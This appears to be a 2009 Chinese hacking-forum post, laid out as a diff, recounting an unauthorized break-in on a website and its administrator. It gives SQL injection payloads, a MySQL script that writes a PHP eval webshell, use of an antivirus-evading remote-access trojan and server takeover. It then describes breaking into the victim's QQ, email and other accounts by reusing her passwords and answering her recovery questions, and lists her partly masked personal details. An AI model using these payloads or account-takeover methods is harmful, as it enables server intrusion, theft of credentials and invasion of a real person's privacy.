@@ -1,0 +1,138 @@
+D0000D发往论坛板块-------------------------------------------------------
+No2  号板块  技术文章
+D8888D贴子标题-------------------------------------------------------
+从服务器渗透到获取个人信息实战
+D8888D主贴内容-------------------------------------------------------
+ 
+
+作者：上帝之爱
+
+很多朋友玩社工都很厉害，社工是攻击中的一种特殊应用，入侵+社工的攻击模式如果利用的好，可以所向披靡，本次的安全检测就是一次简单的尝试。话说某日我在网上胡乱搜索的时候，突然看见有一个php的连接，就忍俊不住的进去看了看，一看不要紧，事情就随之而来了，于是就有了此文！
+（一）安全检测
+1.操刀上阵
+当我看到了链接地址[url=http://www.AAA.com/BBB/CCC.php?pid=XXX]链接标记http://www.AAA.com/BBB/CCC.php?pid=XXX[/url]，就试了试在其地址后丢了个单引号，随之绝对路径就被泄露出来了，嘿嘿！（有时候可能不会简单的一个单引号就暴露路径，你可以试试随便输入一些东西，当然自己灵活运用），路径：F:\AAA\BBB\bbs6.1\CCC\db_mysql.class.php，如图1所示。
+[attach]977[/attach]
+2.信息分析和收集
+目录中以“bbs6.1”命名，bbs不是论坛的意思么？这时我打开了[url=http://www.AAAA.com]链接标记http://www.AAAA.com[/url]   最下方显示的是：Powered by AAA!6.1.0，虽然他改了，但是我们还是可以看出这是一个DZ的论坛。呵呵，上次记得我就发现了一个DZ6.1的论坛存在注射，当时我问了宝哥才知道是插件的原因，但是这个不是，因为BBB目录不是论坛程序，而是另外一个文件目录。
+3. SQL注入测试
+这时候按照老办法，我们提交and 1=1和and 1=2，咦？怎么回事？and 1=1返回正常，但是提交and 1=2的时候，却自动跳转到and 1=1的页面，而且我提交的and 1=2也变成了and 1=1，我用/**/代替空格，发现还是一样的奥，这时我在URL后面加上一个“-1”，新闻页面则变成了另外一则新闻了。哈哈！还是存在注射的啊！所以说不能死脑筋！
+4.获取SQL注入长度
+接着就是判断长度了，order by X ，10个10个的依次递增，最后发现30的时候错误了，告诉我们长度在20-30之间，于是我接着改变长度数字提交，我最后判断长度为23，如图2所示。
+[img]http://www.t00ls.net/images/default/attachimg.gif[/img]  [img]http://www.t00ls.net/attachments/month_0905/09050216389f34f1298dbc1da5.jpg[/img][url=http://www.t00ls.net/attachment.php?aid=OTc4fDZjZTk2YmZkfDEyODY0ODM1MDF8ZTdhMzIyNEVtUE1HWFNJYXRWL29qT25sQ3dOYTNyUkY5NU5tZ0M4NHdud2pWTzA%3D&nothumb=yes]链接标记下载[/url] (102.94 KB)
+
+2009-5-2 16:38
+5.获取数据库版本和用户等信息
+得到长度之后我们就该去找点东东了奥！提交：[url=http://www.AAA.com/BBB/CCC.php?pid=407/]链接标记http://www.AAA.com/BBB/CCC.php?pid=407/[/url]**/and/**/1=2/**/union/**/select/**/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23/*  ，出现了9和11，于是我用version()和user()替换之，查看MYSQL版本和用户，如图3所示，信息如下：
+User  =    root@localhost
+Version  =    5.0.20 –nt-log
+[img]http://www.t00ls.net/images/default/attachimg.gif[/img]  [img]http://www.t00ls.net/attachments/month_0905/09050216386e93bd197d0d5f82.jpg[/img][url=http://www.t00ls.net/attachment.php?aid=OTc5fGJkN2MwOWIwfDEyODY0ODM1MDF8ZTdhMzIyNEVtUE1HWFNJYXRWL29qT25sQ3dOYTNyUkY5NU5tZ0M4NHdud2pWTzA%3D&nothumb=yes]链接标记下载[/url] (137.14 KB)
+
+2009-5-2 16:38
+6.获取数据库密码
+我们可以通过以上信息得出推断，数据库和web在一块没有分离，还是root权限，而且是MYSQL5的，服务器系统是通过上面被爆漏的路径我们可以知道这是Windows系统的，这时ping了下看看，TTL值等于53，not windows？很明显是服务器做了设置，来欺骗我们的眼睛！（有时候不能暴漏路径出来怎么办呢？那就在URL中用大写PHP代替小写php，看看怎么样?返回正常则是windows的反之则是非windows的！）既然是root权限，而且还是MYSQL5的这可有得玩了！Root，那么就不用累死累活的去手工猜解管理员账号和密码了，直接去load_file，读出rootpass。把F:\AAA\BBB\bbs6.1\CCC\db_mysql.class.php 把这个路径转换成16进制的的去读取，查看源文件，查找require或者include引入文件，找到数据库连接文件config.inc.php的真实路径，如图4所示，有时候可能页面无法显示，那就查看源文件。我们修改路径，把config.inc.php改到路径上面，继续转换，接着提交，这时候我们就能查看到root pass信息了，如图5所示。
+= = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = 
+$dbhost = 'localhost'; // 数据库服务器 
+$dbuser = 'root'; // 数据库用户名 
+$dbpw = 'XXX'; // 数据库密码 
+$dbname = 'XXX'; // 数据库名
+= = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = 
+[img]http://www.t00ls.net/images/default/attachimg.gif[/img]  [img]http://www.t00ls.net/attachments/month_0905/09050216389413e52118d45507.jpg[/img][url=http://www.t00ls.net/attachment.php?aid=OTgwfDJiMGI0NmFlfDEyODY0ODM1MDF8ZTdhMzIyNEVtUE1HWFNJYXRWL29qT25sQ3dOYTNyUkY5NU5tZ0M4NHdud2pWTzA%3D&nothumb=yes]链接标记下载[/url] (75.37 KB)
+
+2009-5-2 16:38
+[img]http://www.t00ls.net/images/default/attachimg.gif[/img]  [img]http://www.t00ls.net/attachments/month_0905/0905021646aab0032b5c78313c.jpg[/img][url=http://www.t00ls.net/attachment.php?aid=MTAwOXxlODc3MjhkMnwxMjg2NDgzNTAxfGU3YTMyMjRFbVBNR1hTSWF0Vi9vak9ubEN3TmEzclJGOTVObWdDODR3bndqVk8w&nothumb=yes]链接标记下载[/url] (49.1 KB)
+
+2009-5-2 16:46
+二）小遇周折，提权成功
+但问题此时就出在这里了，大家都知道一般使用mysql数据库的网站，都喜欢使用phpmyadmin来管理数据库，那么我们就来找phpmyadmin的地址，郁闷的是，我找了半天都找不到，我用自己弄的小工具扫php网站后台和phpmyadmin以及上传页面，也米有找到，郁闷了！更郁闷的是magic_quotes_gpc＝on ，况且%2527绕不过魔法引号，也导不出啊！
+这时候我有了一个思路，记得上次我搞一个大的足球网站的时候，root权限，米有找到phpmyadmin，也是MYSQL5，无奈到论坛求助，最后cnxhack牛牛搞定了，他说思路很简单，有DZ6.x的论，那么利用MYSQL5注射到论坛管理员密码，然后登陆进后台开启wap，再利用前段时候的DZ的0day搞定。难道说我也要这么做吗？就在我准备用这种办法的时候，我忽然想到了MYSQL连接器，按照常规来说都是本地才能连接的，这次竟然RP大爆发给了我一次“艳遇”，竟然我连接上去了，如图6所示！oh，我的天啊！太可怕了！既然这样就好办多了，和phpmyadmin一样搞！
+[img]http://www.t00ls.net/images/default/attachimg.gif[/img]  [img]http://www.t00ls.net/attachments/month_0905/0905021652d8d0ae856d6def89.jpg[/img][url=http://www.t00ls.net/attachment.php?aid=MTAxMHwyMDBiY2EwYXwxMjg2NDgzNTAxfGU3YTMyMjRFbVBNR1hTSWF0Vi9vak9ubEN3TmEzclJGOTVObWdDODR3bndqVk8w&nothumb=yes]链接标记下载[/url] (191.64 KB)
+
+2009-5-2 16:52
+3.导出一句话木马
+  在Gmysql编辑器中执行以下脚本：
+= = = == = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = 
+
+Create TABLE a (cmd text NOT NULL);
+Insert INTO a (cmd) VALUES('<?php eval($_POST[cmd]);?>');
+select cmd from a into outfile '网站可写路径/一句话马名.php';
+Drop TABLE IF EXISTS a;
+= = = = = = = = = = = = = = = = == = = = = = == = == = = = == = = = = = = = = = = = = = = 
+赶紧去访问一下一句话马地址，一片空白足以说明成功写入！赶紧上传我的php大马，查看了一下果然是windows系统，而且是2K的服务器！接下来就是提权了，拿了shell不提权有点对不起自己奥！先看看开了3389米有，远程连接一下，连接不上，我用phpshell执行了下命令，发现也不是内网奥！改端口了？又上传了个asp大马，查看了下远程登陆端口，发现果然是改了端口，改为了4401。（4401？不就是“死死等你”的谐音吗？哈哈，天要助我啊！我看见服务器在像向我招手了）
+[attach]999[/attach]
+4.无法创建管理员用户
+这时提权已经不难了，虽然没有SU，但是有了root和MYSQL5，那就简单了，udf导出提权！但是我米有用此种方法，因为我刚才查看开启服务的时候，发现服务器上面有麦咖啡杀软，肯定是不行的，我是直接用phpshell直接建立，这时候拥有系统权限的它有这个权限。先net user一下，发现有几个远程登陆的管理员，我先建立一下试试，没有回显，我擦，怎么回事？明明是管理员权限啊！扔个建立用户的bat运行下看看，再回来看看还是没有建立成功，郁闷了，如图8所示。
+[img]http://www.t00ls.net/images/default/attachimg.gif[/img]  [img]http://www.t00ls.net/attachments/month_0905/0905021645d8e454114b8ff634.jpg[/img][url=http://www.t00ls.net/attachment.php?aid=MTAwMHwxNDA1YmMxY3wxMjg2NDgzNTAxfGU3YTMyMjRFbVBNR1hTSWF0Vi9vak9ubEN3TmEzclJGOTVObWdDODR3bndqVk8w&nothumb=yes]链接标记下载[/url] (52.15 KB)
+
+2009-5-2 16:45
+5.木马帮忙
+记得暗组的new4大哥给我做过一个免杀的暗组远控木马（new4大哥人很不错，他们论坛的免杀很牛X的说），我让安装麦咖啡的朋友测试下，还免杀！，扔上去运行一下，等了一会上线了，如图9所示，哈哈！远程telnet一下，我日奥，原来是开启了密码复杂性，汗！这下不就好办了，随便输入点符合条件就行了！接着就是远程登陆了，OK，进去了，如图10所示，一切都木有什么困难（今天运气这么好，从来RP米有好过，去买彩票肯定中奖）！
+[img]http://www.t00ls.net/images/default/attachimg.gif[/img]  [img]http://www.t00ls.net/attachments/month_0905/0905021652546d00690537afd9.jpg[/img][url=http://www.t00ls.net/attachment.php?aid=MTAxMXw3ZDg4OTNjZXwxMjg2NDgzNTAxfGU3YTMyMjRFbVBNR1hTSWF0Vi9vak9ubEN3TmEzclJGOTVObWdDODR3bndqVk8w&nothumb=yes]链接标记下载[/url] (109.92 KB)
+
+2009-5-2 16:52
+[img]http://www.t00ls.net/images/default/attachimg.gif[/img]  [img]http://www.t00ls.net/attachments/month_0905/09050216454395df046b6c8a85.jpg[/img][url=http://www.t00ls.net/attachment.php?aid=MTAwMXwxNTUzMzM1ZXwxMjg2NDgzNTAxfGU3YTMyMjRFbVBNR1hTSWF0Vi9vak9ubEN3TmEzclJGOTVObWdDODR3bndqVk8w&nothumb=yes]链接标记下载[/url] (46.96 KB)
+
+2009-5-2 16:45
+（三）我也来社工
+1.社工进入其管理的一台服务器
+接下来就这么简单么？不？我看到了有一个管理员的名字引起了我的注意，因为我刚开始在注射之前，不是去那个论坛看过吗？我发现网站管理员也是这个名字，这就引起了我的注意。（众人：引起注意就引起注意了，你想怎么滴？你有他的密码么？装逼了又？我：？？不是的，听我说完，我之前翻网站的时候，看见了一个文件居然有这个管理员的密码，这下不是有了么？试试！众人：？？？。。。。。。。。。。。。。。。）我试了试居然可以登陆远程服务器，如图11所示，密码居然都是一样的。
+[img]http://www.t00ls.net/images/default/attachimg.gif[/img]  [img]http://www.t00ls.net/attachments/month_0905/090502164540493f219b5a055f.jpg[/img][url=http://www.t00ls.net/attachment.php?aid=MTAwMnwzNDM4ODZhYXwxMjg2NDgzNTAxfGU3YTMyMjRFbVBNR1hTSWF0Vi9vak9ubEN3TmEzclJGOTVObWdDODR3bndqVk8w&nothumb=yes]链接标记下载[/url] (59.77 KB)
+
+2009-5-2 16:45
+2.社工进入其管理的论坛
+后面继续社工，还成功的登陆了他的论坛，如图12所示进入了后台（此时已经没有意义了，已经拿到权限了）。这下可有得玩了，继续看看还能不能社工他的其他东西！
+[img]http://www.t00ls.net/images/default/attachimg.gif[/img]  [img]http://www.t00ls.net/attachments/month_0905/09050216464be2d4206f5fcf81.jpg[/img][url=http://www.t00ls.net/attachment.php?aid=MTAwM3xlNTAzMDE0Y3wxMjg2NDgzNTAxfGU3YTMyMjRFbVBNR1hTSWF0Vi9vak9ubEN3TmEzclJGOTVObWdDODR3bndqVk8w&nothumb=yes]链接标记下载[/url] (68.48 KB)
+
+2009-5-2 16:46
+3.社工之收集资料
+呵呵，以前就米有玩过社工，关键这东西也不是说什么难度的，说起来也就是利用你所搜集的资料和够的信息对他所有的账号依次试验，关键是看这个人了，这个人如果太弱智了，社工他是轻而易举的事情！所以大家一定要防范社工，特别是在网络上！
+开始，打开谷歌，开始搜索，我十分汗颜啊！他的东西太多了奥，一个一个的来，我们这时候先不急于用这个密码去试验他所有的账号，而是清净下来，理清一个思路。想了半天，如下：
+（1）把所有他的页面浏览一遍，认真的仔细的查找资料，然后集合到一起对比！选出出现频率比较高的！
+（2）利用这些资料，再对那些有用的地方进行社工，比如邮箱了，或者淘宝上的资料等等（淘宝上面的是基本都是真实资料）
+（3）利用第二次收集的资料再搞第二次没有搞定的，如果第三次都没有效果，那么可以考虑放弃了！
+4.小有收获
+开始按照计划实施，首先我收集了她的个人信息（后来进去她QQ，知道的，空间里面有两个是隐私加密的相册，一个是自拍，一个是个人艺术照，这时我才知道的，这里牵扯到个人生活问题，不能泄露了）如下：
+个人：fXXXXove      冰X
+密码：xxxxx  xxxxxx  xxxxxx
+QQ：648XX14 9143XXXX
+支付宝：fxxxxov
+Email：[url=http://www.t00ls.net/mailto:fxxxxove@qq.com]链接标记fxxxxove@qq.com[/url]      [url=http://www.t00ls.net/mailto:fxxxxove@yahoo.com.cn]链接标记fxxxxove@yahoo.com.cn[/url]       
+联系电话：134xxxx5919
+MSN：[url=http://www.t00ls.net/mailto:fxxxove@hotmail.com]链接标记fxxxove@hotmail.com[/url]
+出生日期：1980年x月x日
+第二步，从第一个开始，先是她DZ官网的登陆密码，进去翻了一下查看个人资料也米有翻到什么其他的东西奥！如图13所示。
+[img]http://www.t00ls.net/images/default/attachimg.gif[/img]  [img]http://www.t00ls.net/attachments/month_0905/0905021646a4a60d365f7afa97.jpg[/img][url=http://www.t00ls.net/attachment.php?aid=MTAwNHwwNDU3Y2RlNnwxMjg2NDgzNTAxfGU3YTMyMjRFbVBNR1hTSWF0Vi9vak9ubEN3TmEzclJGOTVObWdDODR3bndqVk8w&nothumb=yes]链接标记下载[/url] (62.06 KB)
+
+2009-5-2 16:46
+接着用第一个密码进入了她的西祠胡同和爱词霸空间里面，翻了翻，有个现居地和英语四级的简历以及兴趣爱好等等，如图14所示
+[img]http://www.t00ls.net/images/default/attachimg.gif[/img]  [img]http://www.t00ls.net/attachments/month_0905/09050216463666822dd77539b0.jpg[/img][url=http://www.t00ls.net/attachment.php?aid=MTAwNXxiMDg2YmFlYXwxMjg2NDgzNTAxfGU3YTMyMjRFbVBNR1hTSWF0Vi9vak9ubEN3TmEzclJGOTVObWdDODR3bndqVk8w&nothumb=yes]链接标记下载[/url] (32.82 KB)
+
+2009-5-2 16:46
+后面天府论坛和百度空间也成功的进去了，如图15所示，只是百度的密码不一样奥，用的是她的第二个密码，第一个不行！
+[img]http://www.t00ls.net/images/default/attachimg.gif[/img]  [img]http://www.t00ls.net/attachments/month_0905/0905021646d005d4cb280861c7.jpg[/img][url=http://www.t00ls.net/attachment.php?aid=MTAwNnwwZDhhNTVmYXwxMjg2NDgzNTAxfGU3YTMyMjRFbVBNR1hTSWF0Vi9vak9ubEN3TmEzclJGOTVObWdDODR3bndqVk8w&nothumb=yes]链接标记下载[/url] (44.31 KB)
+
+2009-5-2 16:46
+我汗，这女子这么不小心啊，接着是搜房网和新浪的博客，如图16所示，进去看了看，资料基本都还是一样的，不过多出了一个身高（貌似没有用奥）。
+[img]http://www.t00ls.net/images/default/attachimg.gif[/img]  [img]http://www.t00ls.net/attachments/month_0905/090502165216cf20a50dae4fa5.jpg[/img][url=http://www.t00ls.net/attachment.php?aid=MTAxMnxkNGM5Y2QwZHwxMjg2NDgzNTAxfGU3YTMyMjRFbVBNR1hTSWF0Vi9vak9ubEN3TmEzclJGOTVObWdDODR3bndqVk8w&nothumb=yes]链接标记下载[/url] (150.52 KB)
+
+2009-5-2 16:52
+接着又进入了她的天极群乐的空间里面，这时候貌似有点资料奥，如图17所示，性别：女（呵呵，后来也证实了），年龄：32（不会吧，明明我找到的80年的啊，后来进空间看QQ照片，发现不像是32，很年轻的说，可能是80年出生是正确的）现居地：广东深圳（上面的那个山东的是假的？最后根据空间里面的旅游照片判断山东是假的，因为有一个外出郊游的相册，里面的的穿着，时间还有风景不像是山东的，而且南方和北方的气温差异很大，同一时期，衣服穿着是不一样的）最后发现QQ还有MSN以及淘宝的木有搞定，不怕还有机会！
+[img]http://www.t00ls.net/images/default/attachimg.gif[/img]  [img]http://www.t00ls.net/attachments/month_0905/090502164624ebfc5d011dbc54.jpg[/img][url=http://www.t00ls.net/attachment.php?aid=MTAwN3xjMDRlY2ZlM3wxMjg2NDgzNTAxfGU3YTMyMjRFbVBNR1hTSWF0Vi9vak9ubEN3TmEzclJGOTVObWdDODR3bndqVk8w&nothumb=yes]链接标记下载[/url] (62.96 KB)
+
+2009-5-2 16:46
+接着是QQ号码，第一个密码已经失败了，那只有用其他的信息了，我用了出生日期试了试，又不在乎对方是否发现，直接登陆，就算是发现了也算是给对方提个醒吧！发现还是不行，我试着用她的名字和冰X的拼音输入还是不行，出生地的还有其他的拼音也不行。这个时候我们来想一想，对方怎么也是一个受过大学教育的，她不会弱智的用单一的数字或者拼音吧？可能是一个数字和字母的组合，不管它试试，也许是冷静下来的原因，第三次我用fxxxove加上1980居然成功了，虽然还米有看到但是我已经知道了，为什么？因为它提示输入什么登陆地址不一样的什么东东，就是那玩意，输入验证字母成功进入，如图18所示！
+[img]http://www.t00ls.net/images/default/attachimg.gif[/img]  [img]http://www.t00ls.net/attachments/month_0905/0905021646188a594efd9870a8.jpg[/img][url=http://www.t00ls.net/attachment.php?aid=MTAwOHw2MDlmMGU0NnwxMjg2NDgzNTAxfGU3YTMyMjRFbVBNR1hTSWF0Vi9vak9ubEN3TmEzclJGOTVObWdDODR3bndqVk8w&nothumb=yes]链接标记下载[/url] (56.69 KB)
+
+2009-5-2 16:46
+这时候我赶紧去进空间查看资料，以及去邮箱，因为那里保存了很多的有用的信息，别小看了邮箱，它足以威胁到你所有的账号的安全！翻了很多东东不一一列举了，还有剩下的就是淘宝和MSN了，用过的人就知道，注册的时候需要一个找回信息或者更改密码用的邮箱，而她的恰恰是QQ邮箱，这下去试试去，有密码找回问题，她设置的也不是变态，一个是她的居住地之类的，还有就是喜爱看的电影，居住地有了，电影是什么呢？去哪里找呢？对了QQ空间上面不是有一个个人档的么？有一个“我推荐的电影”，我去看了看，她居然填写的是“我”（她自己奥，有点比我自恋），顺利填写完毕，我也懒得去关心结果了，因为我的目的已经达到了，有了邮箱那么可以做的事情不仅仅是这些，通过首次社工学习到了一些经验和防护措施（记得我年少无知之时，N多密码都一样，我赶紧去改去，别让谁给XXX了）！后来进入到这个美眉QQ空间的时候，发现个人照还是很漂亮的，这里不拿出来了，侵犯个人隐私，在百度空间发了一篇新的文章（仅主人可见的）提醒她一下！
+（四）总结与体会
+先谈服务器：按理来说，此服务器上面用的网站程序还是可以的，总共是三个网站，一个是DZ7.0的论坛，还有一个就是此次下手的网站，DZ6.x，另一个是网上卖手机的商城，也还可以，也没有去看，因为刚开始IP域名反查询的时候，是查不到的。但是那个DZ6.x的居然另外放了个其他的存在注射的，汗，无语！倘若此时我一次服务器开始嗅探，估计又能拿下其他同网段的服务器吧！没有必要了！
+再谈社工：仅以此事件提醒广大网友，不要把个人的真实资料泄露在网络上，那是非常可怕的！还有不要把自己的密码都设置成一样的，也不要以自己的出生日期或者真实资料作为密码，那样是非常不安全的！
+[url=http://www.t00ls.net/attachment.php?aid=OTgxfGI1NTJjZTlhfDEyODY0ODM1MDF8ZTdhMzIyNEVtUE1HWFNJYXRWL29qT25sQ3dOYTNyUkY5NU5tZ0M4NHdud2pWTzA%3D&nothumb=yes]链接标记4.jpg[/url] (148.1 KB) 
+下载次数:0
+2009-5-2 16:38
+
+ [img]http://www.t00ls.net/attachments/month_0905/0905021638eabfe4e480a211a6.jpg[/img][url=http://www.t00ls.net/attachment.php?aid=MTAxM3xmY2M3NGJhMHwxMjg2NDgzNTAxfGU3YTMyMjRFbVBNR1hTSWF0Vi9vak9ubEN3TmEzclJGOTVObWdDODR3bndqVk8w&nothumb=yes]链接标记16.jpg[/url] (160.53 KB) 
+下载次数:0
+2009-5-2 16:52
+
+ [img]http://www.t00ls.net/attachments/month_0905/09050216526172f7e90ab286d7.jpg[/img]
